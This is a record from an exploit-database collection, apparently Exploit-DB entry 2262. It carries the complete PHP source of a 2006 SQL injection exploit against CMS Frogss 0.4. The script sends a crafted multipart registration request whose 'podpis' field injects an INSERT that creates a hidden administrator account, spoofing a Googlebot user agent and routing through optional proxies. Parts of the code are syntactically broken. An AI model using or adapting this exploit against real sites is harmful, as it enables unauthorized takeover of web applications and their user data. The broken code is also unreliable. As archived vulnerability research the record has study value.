{
  "id": "2262",
  "title": "CMS Frogss 0.4 - &#039;podpis&#039; SQL Injection",
  "cve": "CVE-2006-4536",
  "vuln_type": "sqli",
  "code": "<?php\r\necho \"+~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~\";\r\necho \"+\\r\\n\";\r\necho \"-   - - [DEVIL TEAM THE BEST POLISH TEAM] - -\\r\\n\\r\\n\";\r\necho \"+\\r\\n\";\r\necho \"+~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~\\\"\\r\\n\";\r\necho \"+\\r\\n\\r\\n\";\r\necho \"- CMS frogss <= 0.4 (podpis) SQL Injection Exploit [creat new admin]\"\\r\\n\";\r\necho \"+\"\\r\\n\";\r\necho \"+~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~\"\\r\\n\";\r\necho \"+\"\\r\\n\";\r\necho \"- [Script name: CMS frogss v.0.4\"\\r\\n\";\r\necho \"- [Script site: http://frogss.be/download.php?id=1\"\\r\\n\";\r\necho \"+\"\\r\\n\";\r\necho \"+~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~\"\\r\\n\";\r\necho \"+\"\\r\\n\";\r\necho \"-          Find by: Kacper (a.k.a Rahim)\"\\r\\n\";\r\necho \"+\"\\r\\n\";\r\necho \"-          Contact: kacper1964@yahoo.pl\"\\r\\n\";\r\necho \"-                        or\"\\r\\n\";\r\necho \"-           http://www.rahim.webd.pl/\"\\r\\n\";\r\necho \"+\"\\r\\n\";\r\necho \"+~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~\\\"\\r\\n\";\r\necho \"+\"\\r\\n\";\r\necho \"- Special Greetz: DragonHeart ;-)\"\\r\\n\";\r\necho \"- Ema: Leito, Adam, DeathSpeed, Drzewko, pepi, nukedclx, mivus ;]\"\\r\\n\";\r\necho \"+\"\\r\\n\";\r\necho \"!@ Przyjazni nie da sie zamienic na marne korzysci @!\"\\r\\n\";\r\necho \"+\"\\r\\n\";\r\necho \"+~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~\\\"\\r\\n\";\r\necho \"+\"\\r\\n\";\r\necho \"-            Z Dedykacja dla osoby,\"\\r\\n\";\r\necho \"-         bez ktorej nie mogl bym zyc...\"\\r\\n\";\r\necho \"-           K.C:* J.M (a.k.a Magaja)\"\\r\\n\";\r\necho \"+\"\\r\\n\";\r\necho \"+~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~\\\"\\r\\n\";\r\necho \"+\"\\r\\n\";\r\necho \"Usage: www.site.com /path/ UserName Password proxy \"\\r\\n\";\r\necho \"ex: www.site.com <= site host \"\\r\\n\";\r\necho \"ex: /path/ <= script path \"\\r\\n\";\r\necho \"ex: Username <= exploit username \"\\r\\n\";\r\necho \"ex: Password <= exploit password \"\\r\\n\";\r\necho \"ex: proxy <= optional ;-) \"\\r\\n\";\r\necho \"+\"\\r\\n\";\r\necho \"+~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~\\\"\\r\\n\";\r\necho \"EX: www.site.com /frogss/ Evil hacker 127.0.0.1 \"\\r\\n\";\r\necho \"+~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~\\\"\\r\\n\";\r\n\r\n/*\r\nvulnerable code => module/rejestracja.php line 56-87:\r\n....\r\nfunction ok()\r\n{\r\n    global $login,$haslo,$email,$miasto,$www,$gg,$tlen,$poziom,$podpis,$last_log,$logowan,$komentarzy,$odwiedzin,$ip,$lan;\r\n    $query=mysql_query(\"SELECT login FROM uzytkownicy WHERE login='\".$login.\"'\");\r\n    if (!$login) {\r\n\r\n    echo 'Nie poda\u00b3e\u00b6 Loginu';\r\n    } elseif (!$haslo){\r\n        echo 'Nie poda\u00b3e\u00b6 has\u00b3a';\r\n    } elseif (!$email)\r\n    {\r\n        echo 'Nie poda\u00b3e\u00b6 e-maila';\r\n    } elseif(mysql_num_rows($query)==0)\r\n{\r\nif($www=='http://') $www = '';\r\nif($gg=='gg:') $gg = '';\r\nif($tlen=='tlen:') $tlen = '';\r\n$haslomd5 = md5($haslo);\r\n$ip = $_SERVER['REMOTE_ADDR'];\r\n$query1 = \"INSERT INTO uzytkownicy VALUES(NOT NULL, '$login', '$haslomd5', '$email', '$miasto', '$www', '$gg', '$tlen', '$poziom', '$podpis', NOW(), '$last_log', '$logowan', '$komentarzy', '$odwiedzin', 'offline', '', '', '', '', '', '', '', '', '', '', '', '', '', '', '', '', '', '0', '0', '0', '$ip')\";\r\n$result = mysql_query ($query1);\r\nif($result)\r\n        {\r\n            echo '<br>'.$lan['registration_add'].'<br>';\r\n        }\r\n        else\r\n        {\r\n            echo '<br>'.$lan['registration_add_error'].'<br><br>';\r\n        }\r\n}\r\nelse\r\n{\r\n....\r\nwhen we register to new user in $podpis we can insert in  SQL injection ;-)\r\n\r\n*/\r\n\r\n\r\nerror_reporting(0);\r\nini_set(\"max_execution_time\",0);\r\nini_set(\"default_socket_timeout\",5);\r\nob_implicit_flush (1);\r\nfunction show($headeri)\r\n{\r\n  $ii=0;$ji=0;$ki=0;$ci=0;\r\n  echo '<table border=\"0\"><tr>';\r\n  while ($ii <= strlen($headeri)-1){\r\n    $datai=dechex(ord($headeri[$ii]));\r\n    if ($ji==16) {\r\n      $ji=0;\r\n      $ci++;\r\n      echo \"<td>&nbsp;&nbsp;</td>\";\r\n      for ($li=0; $li<=15; $li++) {\r\n        echo \"<td>\".htmlentities($headeri[$li+$ki]).\"</td>\";\r\n\t\t}\r\n      $ki=$ki+16;\r\n      echo \"</tr><tr>\";\r\n    }\r\n    if (strlen($datai)==1) {\r\n      echo \"<td>0\".htmlentities($datai).\"</td>\";\r\n    }\r\n    else {\r\n      echo \"<td>\".htmlentities($datai).\"</td> \";\r\n    }\r\n    $ii++;$ji++;\r\n  }\r\n  for ($li=1; $li<=(16 - (strlen($headeri) % 16)+1); $li++) {\r\n    echo \"<td>&nbsp&nbsp</td>\";\r\n  }\r\n  for ($li=$ci*16; $li<=strlen($headeri); $li++) {\r\n    echo \"<td>\".htmlentities($headeri[$li]).\"</td>\";\r\n  }\r\n  echo \"</tr></table>\";\r\n}\r\n\r\n$proxy_regex = '(\\b\\d{1,3}\\.\\d{1,3}\\.\\d{1,3}\\.\\d{1,3}\\:\\d{1,5}\\b)';\r\n\r\nfunction sendpacket()\r\n{\r\n  global $proxy, $host, $port, $packet, $html, $proxy_regex;\r\n  $socket = socket_create(AF_INET, SOCK_STREAM, SOL_TCP);\r\n  if ($socket < 0) {\r\n    echo \"socket_create() failed: reason: \" . socket_strerror($socket) . \"<br>\";\r\n  }\r\n  else {\r\n    $c = preg_match($proxy_regex,$proxy);\r\n    if (!$c) {echo 'Not a valid proxy...';\r\n    die;\r\n    }\r\n  echo \"OK.<br>\";\r\n  echo \"Attempting to connect to \".$host.\" on port \".$port.\"...<br>\";\r\n  if ($proxy=='') {\r\n    $result = socket_connect($socket, $host, $port);\r\n  }\r\n  else {\r\n    $parts =explode(':',$proxy);\r\n    echo 'Connecting to '.$parts[0].':'.$parts[1].' proxy...<br>';\r\n    $result = socket_connect($socket, $parts[0],$parts[1]);\r\n  }\r\n  if ($result < 0) {\r\n    echo \"socket_connect() failed.\\r\\nReason: (\".$result.\") \" . socket_strerror($result) . \"<br><br>\";\r\n  }\r\n  else {\r\n    echo \"OK.<br><br>\";\r\n    $html= '';\r\n    socket_write($socket, $packet, strlen($packet));\r\n    echo \"Reading response:<br>\";\r\n    while ($out= socket_read($socket, 2048)) {$html.=$out;}\r\n    echo nl2br(htmlentities($html));\r\n    echo \"Closing socket...\";\r\n    socket_close($socket);\r\n  }\r\n  }\r\n}\r\n\r\nfunction refresh()\r\n{\r\n  flush();\r\n  ob_flush();\r\n  usleep(5000000000);\r\n}\r\n\r\nfunction sendpacketii($packet)\r\n{\r\n  global $proxy, $host, $port, $html, $proxy_regex;\r\n  if ($proxy=='') {\r\n    $ock=fsockopen(gethostbyname($host),$port);\r\n    if (!$ock) {\r\n      echo 'No response from '.htmlentities($host); die;\r\n    }\r\n  }\r\n  else {\r\n\t$c = preg_match($proxy_regex,$proxy);\r\n    if (!$c) {\r\n      echo 'Not a valid prozy...';die;\r\n    }\r\n    $parts=explode(':',$proxy);\r\n    echo 'Connecting to '.$parts[0].':'.$parts[1].' proxy...<br>';\r\n    $ock=fsockopen($parts[0],$parts[1]);\r\n    if (!$ock) {\r\n      echo 'No response from proxy...';die;\r\n\t}\r\n  }\r\n  fputs($ock,$packet);\r\n  if ($proxy=='') {\r\n    $html='';\r\n    while (!feof($ock)) {\r\n      $html.=fgets($ock);\r\n    }\r\n  }\r\n  else {\r\n    $html='';\r\n    while ((!feof($ock)) or (!eregi(chr(0x0d).chr(0x0a).chr(0x0d).chr(0x0a),$html))) {\r\n      $html.=fread($ock,1);\r\n    }\r\n  }\r\n  fclose($ock);echo nl2br(htmlentities($html));\r\n}\r\n\r\nfunction make_seed()\r\n{\r\n   list($usec, $sec) = explode(' ', microtime());\r\n   return (float) $sec + ((float) $usec * 100000);\r\n}\r\n\r\n$host=$_POST[host];$port=$_POST[port];$path=$_POST[path];\r\n$USER=$_POST[USER];$PASS=$_POST[PASS];$proxy=$_POST[proxy];\r\n\r\necho \"<span class=\\\"Stile5\\\">\";\r\n\r\n  if (($host<>'') and ($path<>''))\r\n  {\r\n    $port=intval(trim($port));\r\n    if ($port=='') {$port=80;}\r\n    if (($path[0]<>'/') or ($path[strlen($path)-1]<>'/')) {die('Error... check the path!');}\r\n    if ($proxy=='') {$p=$path;} else {$p='http://'.$host.':'.$port.$path;}\r\n\r\n  }\r\n  if (($host<>'') and ($path<>'') and ($USER<>'') and ($PASS<>''))\r\n  {\r\n  \r\n    $sql=\"') INSERT INTO uzytkownicy VALUES(1, Kacper, b98092e78aa47e68ae2ba617137960a4, devilteam@hackers.pl, NULL, http://www.rahim.webd.pl/, NULL, NULL, 0, DEVILTEAM, NOW(), 99999, 99999, 99999, 9999, offline, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, 0, 0, 0, 4)/*\";\r\n    $data='-----------------------------7d62702f250530\r\n    Content-Disposition: form-data; name=\"login\";\r\n    \r\n    '.$USER.'\r\n    -----------------------------7d62702f250530\r\n    Content-Disposition: form-data; name=\"haslo\";\r\n    \r\n    '.$PASS.'\r\n    -----------------------------7d62702f250530\r\n    Content-Disposition: form-data; name=\"email\";\r\n    \r\n    devilteam@polish-hackers.pl\r\n    -----------------------------7d62702f250530\r\n    Content-Disposition: form-data; name=\"miasto\";\r\n    \r\n    localhost\r\n    -----------------------------7d62702f250530\r\n    Content-Disposition: form-data; name=\"www\";\r\n    \r\n    http://www.rahim.webd.pl/\r\n    -----------------------------7d62702f250530\r\n    Content-Disposition: form-data; name=\"gg\";\r\n    \r\n    000000\r\n    -----------------------------7d62702f250530\r\n    Content-Disposition: form-data; name=\"tlen\";\r\n    \r\n    h20\r\n    -----------------------------7d62702f250530--\r\n    Content-Disposition: form-data; name=\"podpis\";\r\n    \r\n    '.$sql.'\r\n    -----------------------------7d62702f250530--\r\n    Content-Disposition: form-data; name=\"Dodaj\";\r\n    \r\n    Dodaj\r\n    -----------------------------7d62702f250530--\r\n    ';\r\n\r\n    $packet =\"POST \".$p.\"login.php HTTP/1.1\\r\\n\";\r\n    $packet.=\"User-Agent: Googlebot/2.1\\r\\n\";\r\n    $packet.=\"Host: \".$host.\"\\r\\n\";\r\n    $packet.=\"Accept: text/plain\\r\\n\";\r\n    $packet.=\"Referer: http://\".$host.$path.\"index.php?lang=en\\r\\n\";\r\n    $packet.=\"Content-Type: multipart/form-data; boundary=---------------------------7d62702f250530\\r\\n\";\r\n    $packet.=\"Content-Length: \".strlen($data).\"\\r\\n\";\r\n    $packet.=$data;\r\n\t$packet.=\"Connection: Close\\r\\n\";\r\n    show($packet);\r\n    sendpacketii($packet);\r\n    if (!eregi(\"Location:\",$html)) {die(\"Failed to login...\");}\r\n    $temp=explode(\"Set-Cookie: \",$html);\r\n    $COOKIE='';\r\n    for ($i=1; $i<=6; $i++)\r\n    {\r\n      $temp2=explode(\" \",$temp[$i]);\r\n      $COOKIE.=\" \".$temp2[0];\r\n    }\r\n   if (eregi(\"The user has successfully been added\",$html))\r\n{\r\n  echo \"exploit succeeded... now login as admin\\n\";\r\n  echo \"with username \\\"Kacper\"\\\" and password \\\"devilteam\"\\\"\\n\";\r\n  echo \".$host.\"/Administracja/index.php\\\"\\n\";\r\n  echo \"Greetz ;-)\"\\n\";\r\n}\r\n?>\r\n\r\n# milw0rm.com [2006-08-27]",
  "url": "https://www.exploit-db.com/exploits/2262"
}